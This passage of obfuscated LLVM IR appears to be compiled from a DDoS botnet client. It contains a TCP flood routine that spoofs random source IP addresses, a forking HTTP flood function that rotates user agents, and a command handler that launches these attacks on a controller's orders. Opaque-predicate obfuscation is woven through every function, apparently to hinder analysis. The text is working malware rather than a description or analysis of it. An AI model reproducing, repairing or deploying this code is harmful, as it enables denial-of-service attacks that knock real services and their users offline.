  %624 = trunc i32 %623 to i16
  %625 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %626 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %625, i32 0, i32 0
  %627 = bitcast %union.anon* %626 to %struct.anon.0*
  %628 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %627, i32 0, i32 5
  store i16 %624, i16* %628, align 2
  %629 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %630 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %629, i32 0, i32 0
  %631 = bitcast %union.anon* %630 to %struct.anon.0*
  %632 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %631, i32 0, i32 6
  store i16 0, i16* %632, align 4
  %633 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %634 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %633, i32 0, i32 0
  %635 = bitcast %union.anon* %634 to %struct.anon.0*
  %636 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %635, i32 0, i32 7
  store i16 0, i16* %636, align 2
  %637 = load i32, i32* %9, align 4
  %638 = icmp eq i32 %637, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %469
  %639 = load i32, i32* %17, align 4
  %640 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %641 = call i64 @sendto(i32 %639, i8* %121, i64 %119, i32 0, %struct.sockaddr* %640, i32 16)
  %642 = load i32, i32* %19, align 4
  %643 = call i32 @getRandomIP(i32 %642)
  %644 = call i32 @htonl(i32 %643) #10
  %645 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %646 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %645, i32 0, i32 8
  store i32 %644, i32* %646, align 4
  %647 = call i32 @rand_cmwc()
  %648 = trunc i32 %647 to i16
  %649 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %650 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %649, i32 0, i32 3
  store i16 %648, i16* %650, align 4
  %651 = call i32 @rand_cmwc()
  %652 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %653 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %652, i32 0, i32 0
  %654 = bitcast %union.anon* %653 to %struct.anon.0*
  %655 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %654, i32 0, i32 2
  store i32 %651, i32* %655, align 4
  %656 = call i32 @rand_cmwc()
  %657 = trunc i32 %656 to i16
  %658 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %659 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %658, i32 0, i32 0
  %660 = bitcast %union.anon* %659 to %struct.anon.0*
  %661 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %660, i32 0, i32 0
  store i16 %657, i16* %661, align 4
  %662 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %663 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %662, i32 0, i32 0
  %664 = bitcast %union.anon* %663 to %struct.anon.0*
  %665 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %664, i32 0, i32 6
  store i16 0, i16* %665, align 4
  %666 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %667 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %668 = call zeroext i16 @tcpcsum(%struct.iphdr* %666, %struct.tcphdr* %667)
  %669 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %670 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %669, i32 0, i32 0
  %671 = bitcast %union.anon* %670 to %struct.anon.0*
  %672 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %671, i32 0, i32 6
  store i16 %668, i16* %672, align 4
  %673 = bitcast i8* %121 to i16*
  %674 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %675 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %674, i32 0, i32 2
  %676 = load i16, i16* %675, align 2
  %677 = zext i16 %676 to i32
  %678 = call zeroext i16 @csum(i16* %673, i32 %677)
  %679 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %680 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %679, i32 0, i32 7
  store i16 %678, i16* %680, align 2
  %681 = load i32, i32* %25, align 4
  %682 = load i32, i32* %15, align 4
  %683 = icmp eq i32 %681, %682
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %536
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %554
  %684 = load i32, i32* %25, align 4
  %_75 = shl i32 %684, 1
  %_76 = sub i32 %684, 1
  %gen77 = mul i32 %_76, 1
  %_78 = sub i32 0, %684
  %gen79 = add i32 %_78, 1
  %_80 = sub i32 %684, 1
  %gen81 = mul i32 %_80, 1
  %_82 = sub i32 0, %684
  %gen83 = add i32 %_82, 1
  %_84 = shl i32 %684, 1
  %_85 = shl i32 %684, 1
  %685 = add i32 %684, 1
  store i32 %685, i32* %25, align 4
  br label %originalBB74

originalBB89alteredBB:                            ; preds = %originalBB89, %575
  br label %originalBB89
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.69
  %16 = load i32, i32* @y.70
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 4
  %25 = load i8**, i8*** %24, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %29 = bitcast %struct.in_addr* %28 to i8*
  %30 = load %struct.hostent*, %struct.hostent** %6, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 3
  %32 = load i32, i32* %31, align 4
  %33 = sext i32 %32 to i64
  call void @bcopy(i8* %27, i8* %29, i64 %33) #5
  %34 = load i16, i16* %5, align 2
  %35 = call zeroext i16 @htons(i16 zeroext %34) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %38, i32* %9, align 4
  %39 = load i32, i32* %9, align 4
  %40 = bitcast i32* %8 to i8*
  %41 = call i32 @setsockopt(i32 %39, i32 6, i32 1, i8* %40, i32 4) #5
  %42 = load i32, i32* %9, align 4
  %43 = icmp eq i32 %42, -1
  %44 = load i32, i32* @x.69
  %45 = load i32, i32* @y.70
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %53

; <label>:52:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %61

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* %9, align 4
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = call i32 @connect(i32 %54, %struct.sockaddr* %55, i32 16)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %53
  store i32 0, i32* %3, align 4
  br label %61

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %9, align 4
  store i32 %60, i32* %3, align 4
  br label %61

; <label>:61:                                     ; preds = %59, %58, %52, %13
  %62 = load i32, i32* @x.69
  %63 = load i32, i32* @y.70
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i32, i32* %3, align 4
  %71 = load i32, i32* @x.69
  %72 = load i32, i32* @y.70
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %14
  %79 = load %struct.hostent*, %struct.hostent** %6, align 8
  %80 = getelementptr inbounds %struct.hostent, %struct.hostent* %79, i32 0, i32 4
  %81 = load i8**, i8*** %80, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 0
  %83 = load i8*, i8** %82, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %85 = bitcast %struct.in_addr* %84 to i8*
  %86 = load %struct.hostent*, %struct.hostent** %6, align 8
  %87 = getelementptr inbounds %struct.hostent, %struct.hostent* %86, i32 0, i32 3
  %88 = load i32, i32* %87, align 4
  %89 = sext i32 %88 to i64
  call void @bcopy(i8* %83, i8* %85, i64 %89) #5
  %90 = load i16, i16* %5, align 2
  %91 = call zeroext i16 @htons(i16 zeroext %90) #10
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %91, i16* %92, align 2
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %93, align 4
  %94 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %94, i32* %9, align 4
  %95 = load i32, i32* %9, align 4
  %96 = bitcast i32* %8 to i8*
  %97 = call i32 @setsockopt(i32 %95, i32 6, i32 1, i8* %96, i32 4) #5
  %98 = load i32, i32* %9, align 4
  %99 = icmp eq i32 %98, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %100 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %originalBBpart214, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %118

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #5
  %34 = srem i32 %33, 59
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.110, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #5
  %39 = call i32 @fork() #5
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %82

; <label>:41:                                     ; preds = %28
  br label %42

; <label>:42:                                     ; preds = %80, %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = call i64 @time(i64* null) #5
  %46 = icmp sgt i64 %44, %45
  br i1 %46, label %47, label %81

; <label>:47:                                     ; preds = %42
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %80

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* @x.71
  %55 = load i32, i32* @y.72
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %53
  %62 = load i32, i32* %13, align 4
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %64 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %65 = call i64 @strlen(i8* %64) #9
  %66 = call i64 @write(i32 %62, i8* %63, i64 %65)
  %67 = load i32, i32* %13, align 4
  %68 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %69 = call i64 @read(i32 %67, i8* %68, i64 1)
  %70 = load i32, i32* %13, align 4
  %71 = call i32 @close(i32 %70)
  %72 = load i32, i32* @x.71
  %73 = load i32, i32* @y.72
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %80

; <label>:80:                                     ; preds = %originalBBpart2, %47
  br label %42

; <label>:81:                                     ; preds = %42
  call void @exit(i32 0) #12
  unreachable

; <label>:82:                                     ; preds = %28
  %83 = load i32, i32* @x.71
  %84 = load i32, i32* @y.72
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %82
  %91 = load i32, i32* @x.71
  %92 = load i32, i32* @y.72
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %99

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* @x.71
  %101 = load i32, i32* @y.72
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  %108 = load i32, i32* %14, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %14, align 4
  %110 = load i32, i32* @x.71
  %111 = load i32, i32* @y.72
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %24

; <label>:118:                                    ; preds = %24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %53
  %119 = load i32, i32* %13, align 4
  %120 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %121 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %122 = call i64 @strlen(i8* %121) #9
  %123 = call i64 @write(i32 %119, i8* %120, i64 %122)
  %124 = load i32, i32* %13, align 4
  %125 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %126 = call i64 @read(i32 %124, i8* %125, i64 1)
  %127 = load i32, i32* %13, align 4
  %128 = call i32 @close(i32 %127)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %82
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  %129 = load i32, i32* %14, align 4
  %_ = sub i32 %129, 1
  %gen = mul i32 %_, 1
  %_7 = shl i32 %129, 1
  %_8 = sub i32 %129, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 %129, 1
  %gen11 = mul i32 %_10, 1
  %_12 = shl i32 %129, 1
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %14, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %30 = load i8**, i8*** %4, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @strcmp(i8* %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0)) #9
  %34 = icmp ne i32 %33, 0
  br i1 %34, label %52, label %35

; <label>:35:                                     ; preds = %2
  %36 = load i32, i32* @x.73
  %37 = load i32, i32* @y.74
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i32, i32* @x.73
  %45 = load i32, i32* @y.74
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %1091

; <label>:52:                                     ; preds = %2
  %53 = load i32, i32* @x.73
  %54 = load i32, i32* @y.74
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8**, i8*** %4, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @strcmp(i8* %63, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.112, i32 0, i32 0)) #9
  %65 = icmp ne i32 %64, 0
  %66 = load i32, i32* @x.73
  %67 = load i32, i32* @y.74
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %65, label %133, label %74

; <label>:74:                                     ; preds = %originalBBpart24
  %75 = load i32, i32* %3, align 4
  %76 = icmp slt i32 %75, 6
  br i1 %76, label %89, label %77

; <label>:77:                                     ; preds = %74
  %78 = load i8**, i8*** %4, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 3
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 @atoi(i8* %80) #9
  %82 = icmp slt i32 %81, 1
  br i1 %82, label %89, label %83

; <label>:83:                                     ; preds = %77
  %84 = load i8**, i8*** %4, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 5
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @atoi(i8* %86) #9
  %88 = icmp slt i32 %87, 1
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %83, %77, %74
  br label %1091

; <label>:90:                                     ; preds = %83
  %91 = call i32 @listFork()
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %110

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* @x.73
  %95 = load i32, i32* @y.74
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %93
  %102 = load i32, i32* @x.73
  %103 = load i32, i32* @y.74
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %1091

; <label>:110:                                    ; preds = %90
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 1
  %113 = load i8*, i8** %112, align 8
  %114 = load i8**, i8*** %4, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 2
  %116 = load i8*, i8** %115, align 8
  %117 = load i8**, i8*** %4, align 8
  %118 = getelementptr inbounds i8*, i8** %117, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = call i32 @atoi(i8* %119) #9
  %121 = trunc i32 %120 to i16
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 4
  %124 = load i8*, i8** %123, align 8
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 5
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @atoi(i8* %127) #9
  %129 = load i8**, i8*** %4, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 6
  %131 = load i8*, i8** %130, align 8
  %132 = call i32 @atoi(i8* %131) #9
  call void @SendHTTP(i8* %113, i8* %116, i16 zeroext %121, i8* %124, i32 %128, i32 %132)
  call void @exit(i32 0) #12
  unreachable

; <label>:133:                                    ; preds = %originalBBpart24
  %134 = load i32, i32* @x.73
  %135 = load i32, i32* @y.74
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %133
  %142 = load i8**, i8*** %4, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 0
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @strcmp(i8* %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.113, i32 0, i32 0)) #9
  %146 = icmp ne i32 %145, 0
  %147 = load i32, i32* @x.73
  %148 = load i32, i32* @y.74
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %146, label %332, label %155

; <label>:155:                                    ; preds = %originalBBpart212
  %156 = load i32, i32* %3, align 4
  %157 = icmp slt i32 %156, 6
  br i1 %157, label %223, label %158

; <label>:158:                                    ; preds = %155
  %159 = load i8**, i8*** %4, align 8
  %160 = getelementptr inbounds i8*, i8** %159, i64 3
  %161 = load i8*, i8** %160, align 8
  %162 = call i32 @atoi(i8* %161) #9
  %163 = icmp eq i32 %162, -1
  br i1 %163, label %223, label %164

; <label>:164:                                    ; preds = %158
  %165 = load i32, i32* @x.73
  %166 = load i32, i32* @y.74
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %164
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 2
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #9
  %177 = icmp eq i32 %176, -1
  %178 = load i32, i32* @x.73
  %179 = load i32, i32* @y.74
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %177, label %223, label %186

; <label>:186:                                    ; preds = %originalBBpart216
  %187 = load i32, i32* @x.73
  %188 = load i32, i32* @y.74
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %186
  %195 = load i8**, i8*** %4, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 4
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @atoi(i8* %197) #9
  %199 = icmp eq i32 %198, -1
  %200 = load i32, i32* @x.73
  %201 = load i32, i32* @y.74
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %199, label %223, label %208

; <label>:208:                                    ; preds = %originalBBpart220
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 4
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @atoi(i8* %211) #9
  %213 = icmp sgt i32 %212, 1024
  br i1 %213, label %223, label %214

; <label>:214:                                    ; preds = %208
  %215 = load i32, i32* %3, align 4
  %216 = icmp eq i32 %215, 6
  br i1 %216, label %217, label %224

; <label>:217:                                    ; preds = %214
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 5
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @atoi(i8* %220) #9
  %222 = icmp slt i32 %221, 1
  br i1 %222, label %223, label %224

; <label>:223:                                    ; preds = %217, %208, %originalBBpart220, %originalBBpart216, %158, %155
  br label %1091

; <label>:224:                                    ; preds = %217, %214
  %225 = load i8**, i8*** %4, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 1
  %227 = load i8*, i8** %226, align 8
  store i8* %227, i8** %5, align 8
  %228 = load i8**, i8*** %4, align 8
  %229 = getelementptr inbounds i8*, i8** %228, i64 2
  %230 = load i8*, i8** %229, align 8
  %231 = call i32 @atoi(i8* %230) #9
  store i32 %231, i32* %6, align 4
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 3
